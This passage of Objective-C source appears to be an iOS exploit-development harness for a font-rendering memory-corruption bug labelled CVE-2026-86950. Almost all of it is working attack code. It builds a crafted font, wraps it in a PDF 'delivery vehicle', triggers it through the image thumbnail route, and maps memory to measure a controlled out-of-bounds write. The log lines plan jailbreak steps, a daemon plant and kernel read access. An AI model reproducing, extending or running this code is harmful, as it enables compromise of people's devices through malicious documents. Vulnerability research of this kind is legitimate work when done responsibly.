            (unsigned)sysg, ok ? 1 : 0]);
        if (ok) {
            double bscales[] = {1e6,1e8,2.1e9,1e15};
            for (int i=0;i<4;i++) {
                Lv([NSString stringWithFormat:@"[S%02d] sys size=1 scale=%.0e pos=0",
                    i, bscales[i]]);
                p072_render((CGBitmapInfo)kCGImageAlphaPremultipliedLast, sysFont, sysg, 1,
                            bscales[i], bscales[i], 0, 0);
            }
            Lv(@"[sweep] system fallback done 4 renders");
        }
        CFRelease(sysFont);
    }
    if (sys) CFRelease(sys);

    double xs[] = {1e8, 2.1e9, 3.4e10, 1e15, 1e30};
    for (int i=0;i<5;i++) {
        Lv([NSString stringWithFormat:@"[P%02d] path fill extreme=%.0e", i, xs[i]]);
        p072_pathfill(xs[i]);
    }
    Lv(@"[sweep] path done 5 fills");
    if (craftFont) CFRelease(craftFont);

    /* ===== v3: PDF-ingest vehicle (the documented delivery path) ===== */
    Lv(@"=== v3 86950 PDF VEHICLE (ImageIO thumbnail route) ===");
    NSData *ttf3 = p072v3_build_ttf();
    Lv([NSString stringWithFormat:@"v3 font built %lu bytes",
        (unsigned long)ttf3.length]);
    NSData *pdf3 = p072v3_build_pdf(ttf3);
    if (pdf3) {
        Lv([NSString stringWithFormat:@"v3 pdf built %lu bytes",
            (unsigned long)pdf3.length]);
        NSString *pdfPath3 = [docs stringByAppendingPathComponent:@"p072_trigger.pdf"];
        NSString *ttfPath3 = [docs stringByAppendingPathComponent:@"p072_trigger.ttf"];
        BOOL w1 = [ttf3 writeToFile:ttfPath3 atomically:NO];
        if (fd >= 0) fsync(fd);
        BOOL w2 = [pdf3 writeToFile:pdfPath3 atomically:NO];
        Lv([NSString stringWithFormat:@"v3 files written ttf=%@ pdf=%@",
            w1 ? @"OK" : @"FAIL", w2 ? @"OK" : @"FAIL"]);
        if (w2) {
            Lv(@"v3 [thumb] CGImageSourceCreateThumbnailAtIndex NOW (256px)");
            CFURLRef url3 = CFURLCreateWithFileSystemPath(NULL, (__bridge CFStringRef)pdfPath3, kCFURLPOSIXPathStyle, false);
            CGImageSourceRef src3 = url3 ? CGImageSourceCreateWithURL(url3, NULL) : NULL;
            if (url3) CFRelease(url3);
            if (src3) {
                int sz3 = 256;
                CFStringRef k3[] = { kCGImageSourceCreateThumbnailFromImageAlways,
                                     kCGImageSourceThumbnailMaxPixelSize };
                CFTypeRef v3[] = { kCFBooleanTrue,
                                   CFNumberCreate(NULL, kCFNumberIntType, &sz3) };
                CFDictionaryRef opts3 = CFDictionaryCreate(NULL, (const void**)k3, (const void**)v3, 2,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CGImageRef img3 = CGImageSourceCreateThumbnailAtIndex(src3, 0, opts3);
                Lv([NSString stringWithFormat:@"v3 [thumb] SURVIVED img=%p (pre-fix build should have crashed)",
                    (void*)img3]);
                if (img3) CGImageRelease(img3);
                CFRelease(opts3);
                CFRelease(v3[1]);
            } else {
                Lv(@"v3 [thumb] source FAIL");
            }
            if (src3) CFRelease(src3);
        }
    } else {
        Lv(@"v3 pdf build FAIL (flate)");
    }
    Lv(@"v3 crash decode: ips with aa_cache_render + EXC_BAD_ACCESS / 16-bit");
    Lv(@"stores = CVE-2026-86950 confirmed live; craft persisted to Documents/");
    if (craftFont) CFRelease(craftFont);

    /* ===== v5: OOB HARNESS - controlled walk into our own catcher =====
       Note-260 law: V4c (size 17, rgba) walks the blit ~169,813 device px
       off-origin while the wrapped-dx bbox keeps the coverage buffer tiny.
       The span lands at canvas_base + (y*W + x)*4 - v5 makes canvas+catcher
       ONE contiguous vm mapping so the walk lands in OUR tagged memory
       (survivable), then scans for the red pixel rows = measured write. */
    Lv(@"=== v5 86950 OOB HARNESS (canvas+catcher contiguous) ===");
    {
        struct sigaction sa; memset(&sa,0,sizeof sa);
        sa.sa_handler = &p072v5_fault; sigemptyset(&sa.sa_mask);
        sigaction(SIGBUS, &sa, NULL); sigaction(SIGSEGV, &sa, NULL);

        const vm_size_t CVW = 1024, CVH = 1024;
        const vm_size_t CVBYTES = CVW*CVH*4;
        const vm_size_t CATCHBYTES = 256ULL<<20;
        vm_address_t block = 0;
        kern_return_t kva = vm_allocate(mach_task_self(), &block,
                                        CVBYTES + CATCHBYTES, VM_FLAGS_ANYWHERE);
        if (kva != KERN_SUCCESS) {
            Lv([NSString stringWithFormat:@"v5 [alloc] FAIL kr=0x%x - harness skipped", (unsigned)kva]);
        } else {
            uint8_t *canvas = (uint8_t *)block;
            uint8_t *catcher = (uint8_t *)block + CVBYTES;
            memset(canvas, 0, CVBYTES);
            memset(catcher, 0xAB, CATCHBYTES);
            Lv([NSString stringWithFormat:@"v5 [alloc] block=%p canvas=%p catcher=%p contiguous",
                (void*)block, (void*)canvas, (void*)catcher]);
            CGDataProviderRef dpV5 = CGDataProviderCreateWithCFData((__bridge CFDataRef)ttf3);
            CGFontRef fv5 = dpV5 ? CGFontCreateWithDataProvider(dpV5) : NULL;
            if (dpV5) CFRelease(dpV5);
            if (!fv5) {
                Lv(@"v5 [font] load FAIL");
            } else {
                double v5sizes[] = { 17.0, 34.0, 100.0 };
                for (int si = 0; si < 3; si++) {
                    Lv([NSString stringWithFormat:@"v5 [FIRE size=%.0f] pre-render (guarded)",
                        v5sizes[si]]);
                    int sig = 0;
                    if (sigsetjmp(p072v5_jmp, 1) != 0) {
                        p072v5_in = 0;
                        Lv([NSString stringWithFormat:@"v5 [FIRE size=%.0f] FAULT CAUGHT sig=%d (walk uncovered)",
                            v5sizes[si], sig]);
                    } else {
                        p072v5_in = 1;
                        CGColorSpaceRef cs5 = CGColorSpaceCreateDeviceRGB();
                        CGContextRef c5 = CGBitmapContextCreate(canvas, CVW, CVH, 8, CVW*4, cs5,
                                                                kCGImageAlphaPremultipliedLast);
                        if (cs5) CGColorSpaceRelease(cs5);
                        if (c5) {
                            CGContextSetRGBFillColor(c5, 1, 0, 0, 1);
                            CGContextSetFont(c5, fv5);
                            CGContextSetFontSize(c5, v5sizes[si]);
                            CGPoint pv5 = { 20, 20 };
                            CGGlyph gv5 = 10;
                            CGContextShowGlyphsAtPositions(c5, &gv5, &pv5, 1);
                            CGContextFlush(c5);
                            CGContextRelease(c5);
                            p072v5_in = 0;
                            long hits = 0; long first = -1; long last = -1;
                            for (vm_size_t o = 0; o + 3 < CATCHBYTES; o += 4) {
                                if (catcher[o]==0xFF && catcher[o+1]==0 && catcher[o+2]==0 && catcher[o+3]==0xFF) {
                                    if (first < 0) first = (long)o;
                                    last = (long)o; hits++;
                                }
                            }
                            Lv([NSString stringWithFormat:@"v5 [FIRE size=%.0f] SURVIVED - catcher red-quad hits=%ld first=+0x%lx last=+0x%lx",
                                v5sizes[si], hits, first, last]);
                        } else {
                            p072v5_in = 0;
                            Lv(@"v5 [ctx] FAIL");
                        }
                    }
                }
                CFRelease(fv5);
            }
            vm_deallocate(mach_task_self(), block, CVBYTES + CATCHBYTES);
            Lv(@"[v5] SURVIVED+hits: OOB = CONTROLLED write; offset scales with font size.");
        }
    }

    /* ===== v4: DIRECT device-side renders of the v3 chain font =====
       The v3 PDF route survived on pre-fix 23F77 while the same geometry
       renders through direct CG drawing locally. Isolate the route:
       direct ShowGlyphsAtPositions of gid10, pixel-counted. */
    Lv(@"=== v4 DIRECT renders of the chain font (route isolation) ===");
    {
        CGDataProviderRef dpC = CGDataProviderCreateWithCFData((__bridge CFDataRef)ttf3);
        CGFontRef chainFont = dpC ? CGFontCreateWithDataProvider(dpC) : NULL;
        if (dpC) CFRelease(dpC);
        if (!chainFont) {
            Lv(@"v4 font load FAIL — route isolation unavailable");
        } else {
            Lv([NSString stringWithFormat:@"v4 chain font loaded glyphs=%zu",
                CGFontGetNumberOfGlyphs(chainFont)]);
            /* pixels-of-draw helper: white-on-black draw, count non-zero b/px */
            struct { int gray; BOOL smooth; double size; const char *tag; } V4[] = {
                { 0, YES,  1024.0, "V4a rgba size=1024 (chain render, pixel proof)" },
                { 1, NO,   1024.0, "V4b gray+AlphaNone smooth=OFF size=1024 (calif direct recipe)" },
            };
            CGGlyph v4g[] = { 10, 10 };
            for (int vi=0; vi<2; vi++) {
                Lv([NSString stringWithFormat:@"v4 [%s] pre-render",
                    V4[vi].tag]);
                const int D=1024;
                uint8_t *buf = calloc((size_t)D*D, 1);
                CGContextRef c4 = NULL; CGColorSpaceRef cs4 = NULL;
                if (V4[vi].gray) {
                    cs4 = CGColorSpaceCreateDeviceGray();
                    c4 = CGBitmapContextCreate(buf, D, D, 8, D, cs4, kCGImageAlphaNone);
                } else {
                    cs4 = CGColorSpaceCreateDeviceRGB();
                    c4 = CGBitmapContextCreate(buf, D, D, 8, 4*D, cs4,
                                               kCGImageAlphaPremultipliedLast);
                }
                if (c4) {
                    CGContextSetGrayFillColor(c4, 1, 1);
                    CGContextSetFont(c4, chainFont);
                    CGContextSetFontSize(c4, V4[vi].size);
                    CGContextSetShouldSmoothFonts(c4, V4[vi].smooth);
                    CGPoint pv = { 20, 20 };
                    CGGlyph gv = v4g[vi];
                    CGContextShowGlyphsAtPositions(c4, &gv, &pv, 1);
                    CGContextFlush(c4);
                    long px4 = 0;
                    int bpp = V4[vi].gray ? 1 : 4;
                    for (int y=0; y<D; y++)
                        for (int x=0; x<D; x++) {
                            int nz = 0;
                            for (int b=0; b<bpp; b++)
                                nz |= buf[(size_t)(y*D+x)*bpp + b];
                            if (nz) px4++;
                        }
                    Lv([NSString stringWithFormat:@"v4 [%s] SURVIVED pixels=%ld",
                        V4[vi].tag, px4]);
                    CGContextRelease(c4);
                } else {
                    Lv([NSString stringWithFormat:@"v4 [%s] ctx FAIL (mem?)",
                        V4[vi].tag]);
                }
                if (cs4) CGColorSpaceRelease(cs4);
                free(buf);
            }
            CFRelease(chainFont);
        }
    }

    L(@"[oracle] if no crash: naive+band sweep AND the v3 PDF vehicle both");
    L(@"missed on this build — craft persisted for the ips-side decode.");

    L(@"=== VERDICT ===");
    L(@"Slot 1: in-app parse is occupancy of THIS task. 86950 oracle aimed.");
    L(@"Slot 2: daemon plant stays PARK (84598 / lockdownd).");
    L(@"Slot 3: AfterKread board + basebin ingest is the jailbreak file path.");
    L(@"hasKread stays NO. Isolation: one TAP per force-quit.");
    if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
    return log;
}

@end